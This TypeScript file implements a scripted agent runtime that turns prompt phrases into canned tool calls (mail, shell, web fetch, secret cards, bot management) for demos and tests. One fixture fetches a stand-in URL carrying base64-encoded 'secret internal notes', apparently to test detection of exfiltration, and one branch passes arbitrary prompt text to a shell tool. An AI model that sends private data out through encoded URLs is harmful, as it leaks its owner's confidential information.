import type {
  AdapterContext,
  AgentRunRequest,
  AgentRuntime,
  AgentRuntimeEvent,
} from "@rakazo/adapter-kit";
import { abortableDelay, inferHandoffTargetName } from "@rakazo/core";

const running = new Map<string, AbortController>();

export class ScriptedAgentRuntime implements AgentRuntime {
  describe() {
    return {
      id: "scripted",
      contractVersion: "1",
      adapterVersion: "0.1.0",
      capabilities: { streaming: true, compaction: false, tools: true, scripted: true },
    };
  }

  async abort(runId: string): Promise<void> {
    running.get(runId)?.abort();
  }

  async *run(
    request: AgentRunRequest,
    context?: Partial<AdapterContext>,
  ): AsyncIterable<AgentRuntimeEvent> {
    const controller = new AbortController();
    running.set(request.runId, controller);
    const signal = context?.signal ?? controller.signal;
    try {
      // A goal continuation wraps the owner's goal in server text ("Keep working toward all of it");
      // the script follows the goal alone, so that wording cannot start a canned branch.
      const intent = goalContinuationText(request.prompt) ?? request.prompt;
      if (shouldFail(intent)) {
        throw new Error("Scripted run failure");
      }
      if (shouldHang(intent)) {
        yield { type: "progress", text: "still working…", activity: true };
        while (!controller.signal.aborted && !signal.aborted) {
          await abortableDelay(50, controller.signal);
          if (controller.signal.aborted || signal.aborted) break;
          yield { type: "progress", text: "still working…", activity: true };
        }
        yield { type: "done", text: "stopped" };
        return;
      }
      // As the model runtime does at its first turn. A queued message nobody claims goes back in the
      // queue when the run ends and starts another run, so a follow-up here would never stop.
      await request.claimSteering?.([]);
      const script = request.script ?? inferScript(intent, request.resumeFromCheckpoint);
      // Per-run call index so repeated tools (e.g. message_agent) get distinct
      // executionIds — delivery keys and effect replays key off this value.
      let toolCallSeq = 0;
      for (const turn of script) {
        if (signal.aborted || controller.signal.aborted) {
          yield { type: "done", text: "stopped" };
          return;
        }
        if (turn.assistant) {
          yield { type: "progress", text: "working…", activity: true };
          yield { type: "text", text: turn.assistant };
        }
        for (const call of turn.toolCalls ?? []) {
          const executionId = `${request.runId}:${call.name}:${toolCallSeq++}`;
          if (call.name === "run_subagent") {
            const agentId = `${request.runId}:subagent`;
            const name = String(call.args.name ?? "helper");
            const task = String(call.args.task ?? request.prompt);
            yield {
              type: "subagent",
              agentId,
              name,
              task,
              status: "running",
              progress: "working…",
            };
            yield {
              type: "tool",
              name: call.name,
              args: call.args,
              executionId,
            };
            yield {
              type: "subagent",
              agentId,
              name,
              task,
              status: "completed",
              result: `done. i handled: ${task.slice(0, 180)}`,
            };
            continue;
          }
          yield {
            type: "tool",
            name: call.name,
            args: call.args,
            executionId,
          };
        }
        if (turn.ask) {
          yield {
            type: "ask",
            text: turn.ask.text,
            detail: turn.ask.detail,
            actions: turn.ask.actions,
          };
          return;
        }
        if (turn.takeover) {
          yield { type: "takeover", reason: turn.takeover.reason };
          return;
        }
        if (turn.complete) {
          yield {
            type: "usage",
            inputTokens: 12,
            outputTokens: 40,
            cacheReadTokens: 0,
            cacheWriteTokens: 0,
            provider: "scripted",
            model: "scripted",
          };
          yield { type: "done", text: turn.assistant };
          return;
        }
      }
      yield { type: "text", text: "done." };
      yield { type: "done", text: "done." };
    } finally {
      controller.abort();
      running.delete(request.runId);
    }
  }
}

export function inferScript(
  prompt: string,
  resumeFromCheckpoint?: string,
): NonNullable<AgentRunRequest["script"]> {
  const lower = prompt.toLowerCase();
  if (resumeFromCheckpoint === "takeover-skipped") {
    return [
      {
        assistant: "login was skipped. continuing without treating sign-in as done.",
        complete: true,
      },
    ];
  }
  if (resumeFromCheckpoint === "takeover") {
    return [
      {
        assistant:
          "signed in. the session stays in this computer — protected input never hit the thread.",
        complete: true,
      },
    ];
  }
  // Before every content-based intent so payload text cannot steal the branch.
  const shellCommand = /run the shell command\s+([\s\S]+)$/i.exec(prompt)?.[1]?.trim();
  if (shellCommand) {
    return [
      {
        assistant: "running it on my computer.",
        toolCalls: [{ name: "shell", args: { command: shellCommand } }],
        complete: true,
      },
    ];
  }
  // Apps on this computer (docs/local-desktop-control): list, read, then open, which asks once.
  const desktopApp = /use the app (.+?) on this computer/i.exec(prompt)?.[1]?.trim();
  if (desktopApp) {
    return [
      {
        assistant: "checking which apps I may use.",
        toolCalls: [{ name: "desktop_app_list", args: {} }],
      },
      {
        assistant: `reading ${desktopApp}.`,
        toolCalls: [{ name: "desktop_app_snapshot", args: { app: desktopApp } }],
      },
      {
        assistant: `opening ${desktopApp}.`,
        toolCalls: [{ name: "desktop_app_act", args: { app: desktopApp, action: "launch" } }],
        complete: true,
      },
    ];
  }
  if (lower.includes("show email cards")) {
    const emails = [...prompt.matchAll(/([\w-]+)=(today|within_3_days|this_week|later)\b/g)].map(
      ([, id, urgency]) => ({ id, urgency }),
    );
    return [
      {
        assistant: "here are those messages.",
        toolCalls: [{ name: "show_emails", args: { emails } }],
        complete: true,
      },
    ];
  }
  if (lower.includes("archive email card")) {
    // "archive email card id <mail id> from <address>" archives that message.
    const id = /\bid\s+(\S+)/i.exec(prompt)?.[1] ?? "unknown";
    const from = /\bfrom\s+([^\s,]+@[^\s,]+)/i.exec(prompt)?.[1];
    return [
      {
        assistant: "archiving that message.",
        toolCalls: [
          { name: "mail_modify", args: { id, archive: true, ...(from ? { account: from } : {}) } },
        ],
        complete: true,
      },
    ];
  }
  if (lower.includes("reply batch card to ") || lower.includes("outreach card to ")) {
    // "reply batch card to id1,id2,id3 from a@b.test": one row per id, to a fixed test address.
    // "with stranger" puts a Cc that is on no thread on the first row.
    // "outreach card to a@b.test,c@d.test" adds one new email per address, alone or after replies.
    const outreach =
      /outreach card to\s+([^\s]+)/i.exec(prompt)?.[1]?.split(",").filter(Boolean) ?? [];
    const ids =
      /reply batch card to\s+([^\s]+)/i.exec(prompt)?.[1]?.split(",").filter(Boolean) ?? [];
    const from = /\bfrom\s+([^\s,]+@[^\s,]+)/i.exec(prompt)?.[1];
    const stranger = lower.includes("with stranger");
    return [
      {
        assistant: "these replies need your approval.",
        toolCalls: [
          {
            name: "mail_reply_batch",
            args: {
              ...(from ? { account: from } : {}),
              replies: [
                ...ids.map((replyToId, index) => ({
                  replyToId,
                  to: ["customer@example.test"],
                  ...(stranger && index === 0 ? { cc: ["stranger@elsewhere.example.test"] } : {}),
                  subject: `Re: thread ${index + 1}`,
                  body: `Thanks for writing. This is reply ${index + 1}.`,
                })),
                ...outreach.map((to) => ({
                  to: [to],
                  subject: `Hello from us, ${to.split("@")[0]}`,
                  body: `Hi ${to.split("@")[0]}, I wrote this one for you.`,
                })),
              ],
            },
          },
        ],
      },
      { assistant: "the replies are handled on the card.", complete: true },
    ];
  }
  if (lower.includes("send email card")) {
    // "send email card from sales@example.test" names the account; "send email card with no sender"
    // names none; otherwise the fixed test one.
    const from = /\bfrom\s+([^\s,]+@[^\s,]+)/i.exec(prompt)?.[1];
    const noSender = lower.includes("no sender");
    return [
      {
        assistant: "this email needs your approval.",
        toolCalls: [
          {
            name: "mail_send",
            args: {
              ...(noSender ? {} : { account: from ?? "first@example.test" }),
              to: ["Sam Rivera <sam@example.test>"],
              subject: "Offsite dates",
              body: "The 14th works for us.\nSee you then.",
            },
          },
        ],
        complete: true,
      },
    ];
  }
  if (lower.includes("message the bot named") || lower.includes("message bot named")) {
    const name = namedBot(prompt) ?? "Peer";
    const message =
      /named\s+[A-Za-z0-9][A-Za-z0-9_-]{0,39}\s+(?:saying|with|:)\s*([\s\S]+)$/i
        .exec(prompt)?.[1]
        ?.trim() ?? `Please help with: ${prompt}`;
    return [
      {
        assistant: "messaging that bot now.",
        toolCalls: [
          {
            name: "message_bot",
            args: {
              confirm_name: name,
              message,
              intent: "request",
            },
          },
        ],
        complete: true,
      },
    ];
  }
  if (
    lower.includes("launch a cloud agent") ||
    lower.includes("start a cloud agent") ||
    lower.includes("cloud coding agent")
  ) {
    return [
      {
        assistant: "launching a cloud agent for that.",
        toolCalls: [
          {
            name: "cloud_agent_launch",
            args: {
              prompt: "Add a README with setup instructions",
              repository: "https://github.com/example/demo",
              openPr: true,
            },
          },
        ],
        complete: true,
      },
    ];
  }
  if (lower.includes("show a login card")) {
    return [
      {
        assistant: "i need that sign-in in a protected card.",
        toolCalls: [
          {
            name: "request_secret",
            args: {
              label: "Example sign-in",
              purpose: "password",
              credential: {
                name: "example_login",
                origin: "https://login.example.test",
                auth: { type: "login" },
              },
            },
          },
        ],
      },
    ];
  }
  if (
    lower.includes("masked secret card") ||
    lower.includes("show a secret card") ||
    lower.includes("request a masked api key")
  ) {
    return [
      {
        assistant: "i need that value in a protected field.",
        toolCalls: [
          {
            name: "request_secret",
            args: {
              label: "API key",
              purpose: "api_key",
              credential: {
                name: "example_api",
                origin: "https://api.example.test",
                auth: { type: "bearer" },
              },
            },
          },
        ],
      },
    ];
  }
  // The URL is the agent's own choice here, not the owner's words, so site trust does not apply.
  const fetchCard = lower.includes("fetch ordinary card")
    ? "https://docs.example.test/guide/getting-started"
    : lower.includes("fetch suspicious card")
      ? "https://docs.example.test/c?d=c3VwZXIgc2VjcmV0IGludGVybmFsIG5vdGVzIGZvciB0aGUgYm9hcmQ"
      : undefined;
  if (fetchCard) {
    return [
      {
        assistant: "i will read that page.",
        toolCalls: [{ name: "web_fetch", args: { url: fetchCard } }],
      },
    ];
  }
  if (lower.includes("history search card")) {
    return [
      {
        assistant: "i will look through this chat.",
        toolCalls: [{ name: "search_history", args: { query: "history" } }],
        complete: true,
      },
    ];
  }
  if (lower.includes("fetch approval card")) {
    return [
      {
        assistant: "i will read that page.",
        toolCalls: [
          { name: "web_fetch", args: { url: "https://docs.example.test/page?q=fixture" } },
        ],
      },
    ];
  }
  if (lower.includes("mcp approval card")) {
    return [
      {
        assistant: "i will register that server for your approval.",
        toolCalls: [
          {
            name: "add_mcp_server",
            args: {
              name: "Fixture MCP",
              transport: "stdio",
              command: "echo",
              assignToSelf: true,
            },
          },
        ],
      },
    ];
  }
  if (lower.includes("quote markdown fixture")) {
    const marker = /quote markdown fixture\s+(\S+)/i.exec(prompt)?.[1] ?? "md-fixture";
    return [
      {
        assistant: `${marker}
1. list-a
2. list-b

| k | v |
| --- | --- |
| cell-a | cell-b |
| cell-c | cell-d |

\`\`\`
code-a
---
code-b
\`\`\``,
        complete: true,
      },
    ];
  }
  const hasChoices =
    lower.includes("tappable choices") ||
    lower.includes("choice buttons") ||
    lower.includes("pick from these cities");
  if (
    hasChoices ||
    lower.includes("ask me") ||
    lower.includes("which city") ||
    lower.includes("need a decision")
  ) {
    // Background resumes retain the task and append the answered question.
    if (/\nAnswer:/.test(prompt)) {
      return [{ assistant: "thanks. done.", complete: true }];
    }
    return [
      {
        assistant: hasChoices ? "pick one to continue." : "i need a decision before i continue.",
        ask: hasChoices
          ? {
              text: "Which city should I use?",
              detail: "Tap one option.",
              actions: [
                { id: "choice-1", label: "Berlin" },
                { id: "choice-2", label: "Seoul" },
                { id: "choice-3", label: "Toronto" },
                { id: "choice-4", label: "Lisbon" },
              ],
            }
          : { text: "Which city should I use?", detail: "Reply with one city name." },
      },
    ];
  }
  if (lower.includes("take over") || lower.includes("sign in") || lower.includes("login")) {
    return [
      { assistant: "i need you on the screen for a one-time sign-in. handing you the computer." },
      { takeover: { reason: "Sign in to continue. Protected input stays off the thread." } },
    ];
  }
  if (
    lower.includes("observe your screen") ||
    lower.includes("look at your screen") ||
    lower.includes("use your screen")
  ) {
    const typed = /type\s+([A-Za-z0-9._-]+)/i.exec(prompt)?.[1] ?? "ready";
    return [
      {
        assistant: "using my screen now.",
        toolCalls: [
          { name: "computer_observe", args: {} },
          {
            name: "computer_act",
            args: {
              actions: [{ kind: "type", text: typed }],
              observe: true,
            },
          },
        ],
        complete: true,
      },
    ];
  }
  if (
    lower.includes("delete the bot named") ||
    lower.includes("delete the child bot") ||
    lower.includes("delete child")
  ) {
    const name = namedBot(prompt) ?? "Scout";
    return [
      {
        assistant: "archiving that bot.",
        toolCalls: [{ name: "archive_bot", args: { confirm_name: name } }],
        complete: true,
      },
    ];
  }
  // "pipeline import fixture <json rows>": stage in calls of 60, then one review, for demo and tests.
  const importFixture = /pipeline import fixture\s+(\[[\s\S]*\])/i.exec(prompt);
  if (importFixture) {
    try {
      const rows = JSON.parse(importFixture[1] as string) as unknown[];
      const calls = Array.from({ length: Math.ceil(rows.length / 60) }, (_, index) => ({
        toolCalls: [
          {
            name: "pipeline_import_stage",
            args: {
              rows: rows.slice(index * 60, (index + 1) * 60),
              ...(index === 0 ? { start: true } : {}),
            },
          },
        ],
      }));
      return [
        ...calls,
        { toolCalls: [{ name: "pipeline_import_review", args: {} }] },
        { assistant: "the list is handled on the card.", complete: true },
      ];
    } catch {
      // Not JSON: fall through to the other intents.
    }
  }
  // "fundraising fixture round <json>": the Investors agent's round write, for demo and tests.
  const fundraisingFixture = /fundraising fixture round\s+(\{[\s\S]*\})/i.exec(prompt);
  if (fundraisingFixture) {
    try {
      const args = JSON.parse(fundraisingFixture[1] as string) as Record<string, unknown>;
      return [{ toolCalls: [{ name: "fundraising_round_save", args }], complete: true }];
    } catch {
      // Not JSON: fall through to the other intents.
    }
  }
  // "request access fixture <json>": an access request, for demo and tests.
  const accessFixture = /request access fixture\s+(\{[\s\S]*\})/i.exec(prompt);
  if (accessFixture) {
    try {
      const args = JSON.parse(accessFixture[1] as string) as Record<string, unknown>;
      return [{ toolCalls: [{ name: "request_access", args }], complete: true }];
    } catch {
      // Not JSON: fall through to the other intents.
    }
  }
  if (
    lower.includes("create a space") ||
    lower.includes("create space") ||
    lower.includes("new space named") ||
    lower.includes("new private space")
  ) {
    const name = namedSpace(prompt) ?? "New space";
    return [
      {
        assistant: "i can create that separate space after you confirm the boundary.",
        toolCalls: [{ name: "create_space", args: { name } }],
        complete: true,
      },
    ];
  }
  const pageTitle = /\bpage called ([^.\n]+)/i.exec(prompt)?.[1]?.trim();
  if (pageTitle && lower.includes("make a page called")) {
    return [
      {
        assistant: `the ${pageTitle} page is ready.`,
        toolCalls: [{ name: "page_create", args: { title: pageTitle } }],
        complete: true,
      },
    ];
  }
  if (pageTitle && lower.includes("write the page called")) {
    return [
      {
        assistant: "saved.",
        toolCalls: [
          {
            name: "page_write",
            args: { page: pageTitle, content: "# Notes\n\nHello", baseRevision: 1 },
          },
        ],
        complete: true,
      },
    ];
  }
  if (lower.startsWith("say: ")) {
    return [{ assistant: prompt.slice(5), complete: true }];
  }
  if (
    lower.includes("spawn a bot") ||
    lower.includes("spawn a child") ||
    lower.includes("create a bot named") ||
    lower.includes("create a child bot")
  ) {
    const name = namedBot(prompt) ?? "Helper";
    return [
      {
        assistant: "creating a bot for that.",
        toolCalls: [
          {
            name: "spawn_bot",
            args: {
              name,
              title: `${name} specialist`,
              instructions: `You are ${name}.`,
              prompt: "Start on the assigned work.",
            },
          },
        ],
        complete: true,
      },
    ];
  }
  if (
    lower.includes("silence finish notifications") ||
    lower.includes("turn off finish notifications")
  ) {
    return [
      {
        assistant: "silencing finish notifications.",
        toolCalls: [{ name: "update_bot", args: { notifyOnFinish: false } }],
        complete: true,
      },
    ];
  }
  if (
    lower.includes("resume finish notifications") ||
    lower.includes("turn on finish notifications")
  ) {
    return [
      {
        assistant: "enabling finish notifications.",
        toolCalls: [{ name: "update_bot", args: { notifyOnFinish: true } }],
        complete: true,
      },
    ];
  }
  if (lower.includes("subagent") || lower.includes("delegate to a helper")) {
    return [
      {
        assistant: "spinning up a helper for that.",
        toolCalls: [{ name: "run_subagent", args: { name: "helper", task: prompt } }],
        complete: true,
      },
    ];
  }
  if (
    lower.includes("hand this to") ||
    lower.includes("hand off to") ||
    lower.includes("handoff to") ||
    (lower.includes("@writer") && lower.includes("draft"))
  ) {
    const target = inferHandoffTargetName(prompt) ?? "Writer";
    return [
      {
        assistant: "handing this off in the group thread.",
        toolCalls: [
          {
            name: "handoff_to_bot",
            args: {
              confirm_name: target,
              message: prompt,
            },
          },
        ],
        complete: true,
      },
    ];
  }
  if (lower.startsWith("run taught skill:") || lower.includes("this is a safe test")) {
    return [
      {
        assistant:
          "Running the taught skill using its saved playbook. I will follow the demonstrated steps and report the result.",
        complete: true,
      },
    ];
  }
  if (/^run\s+/.test(lower)) {
    return [
      {
        assistant:
          "Using the saved taught skill playbook for that request and following its steps.",
        complete: true,
      },
    ];
  }
  if (lower.includes("connector") || lower.includes("crm") || lower.includes("destination")) {
    return [
      {
        assistant: "writing the record through the connected destination.",
        toolCalls: [
          {
            name: "destination.write",
            args: { collection: "notes", title: "Praci result", body: prompt },
          },
        ],
        complete: true,
      },
    ];
  }
  if (lower.includes("attach") && (lower.includes("thread") || lower.includes("into the thread"))) {
    const said = /says?\s+(.+)$/i.exec(prompt)?.[1]?.replace(/[.]+$/, "") ?? prompt;
    const content = `${said.trim()}\n`;
    const filePath =
      /(?:called|named|path|file)\s+([A-Za-z0-9._/-]+)/i.exec(prompt)?.[1] ?? "notes/result.txt";
    return [
      { assistant: "writing that into my home and attaching it to the thread." },
      { toolCalls: [{ name: "write_file", args: { path: filePath, content } }] },
      { toolCalls: [{ name: "attach_file", args: { path: filePath } }], complete: true },
    ];
  }
  if (
    lower.includes("save shared memory") ||
    lower.includes("update shared memory") ||
    lower.includes("write shared memory")
  ) {
    const contentMatch =
      /\b(?:with|content):\s*([\s\S]+)$/i.exec(prompt) ?? /\bwith\s+([\s\S]+)$/i.exec(prompt);
    const content = contentMatch?.[1]?.trim();
    const header = contentMatch ? prompt.slice(0, contentMatch.index) : prompt;
    const named =
      /(?:named|called|path|file)\s+([A-Za-z0-9._/-]+)/i.exec(header)?.[1] ??
      /shared memory\s+([A-Za-z0-9._/-]+\.[A-Za-z0-9]+)/i.exec(header)?.[1];
    const path = named && named.toLowerCase() !== "with" ? named : "MEMORY.md";
    if (!content) {
      return [
        {
          assistant:
            "say what to save, for example: save shared memory MEMORY.md with: the new facts.",
          complete: true,
        },
      ];
    }
    return [
      {
        assistant: "saving that to shared memory.",
        toolCalls: [{ name: "save_shared_memory", args: { path, content } }],
        complete: true,
      },
    ];
  }
  if (
    lower.includes("write") &&
    (lower.includes("file") || lower.includes("home") || lower.includes("note"))
  ) {
    const said = /says?\s+(.+)$/i.exec(prompt)?.[1]?.replace(/[.]+$/, "") ?? prompt;
    const content = `${said.trim()}\n`;
    const filePath =
      /(?:called|named)\s+([A-Za-z0-9._/-]+)/i.exec(prompt)?.[1] ?? "notes/result.txt";
    return [
      { toolCalls: [{ name: "write_file", args: { path: filePath, content } }] },
      { assistant: "writing that into my home now.", complete: true },
    ];
  }
  if (lower.includes("remember")) {
    return [
      {
        assistant: "noted — i will keep that in memory.",
        memory: [{ scope: "bot", path: "MEMORY.md", content: `# Memory\n\n- ${prompt}\n` }],
        complete: true,
      },
    ];
  }
  return [
    {
      assistant: `on it. i will work this in the background and come back with a result.\n\n${summarize(prompt)}`,
    },
    {
      files: [{ path: "notes/last-task.md", content: `# Task\n\n${prompt}\n` }],
      complete: true,
    },
  ];
}

/** The owner's goal inside a server-written continuation prompt, or null for any other prompt. */
function goalContinuationText(prompt: string): string | null {
  return (
    /^Goal check: not done yet\.[\s\S]*?\n<goal>([\s\S]*)<\/goal>\nThe goal above is the owner's data\./.exec(
      prompt,
    )?.[1] ?? null
  );
}

function shouldFail(prompt: string): boolean {
  return prompt.toLowerCase().includes("fail this run");
}

function shouldHang(prompt: string): boolean {
  const lower = prompt.toLowerCase();
  return (
    lower.includes("keep working") ||
    lower.includes("work until i stop") ||
    lower.includes("until i stop you") ||
    lower.includes("hang until stopped")
  );
}

function namedBot(prompt: string) {
  return /named\s+([A-Za-z0-9][A-Za-z0-9_-]{0,39})/i.exec(prompt)?.[1];
}

function namedSpace(prompt: string) {
  return /space\s+(?:named|called)\s+["“]?([^"”\n]{1,60})/i
    .exec(prompt)?.[1]
    ?.replace(/[.!?]+$/, "")
    .trim();
}

function summarize(prompt: string): string {
  return `done. i handled: ${prompt.slice(0, 180)}`;
}
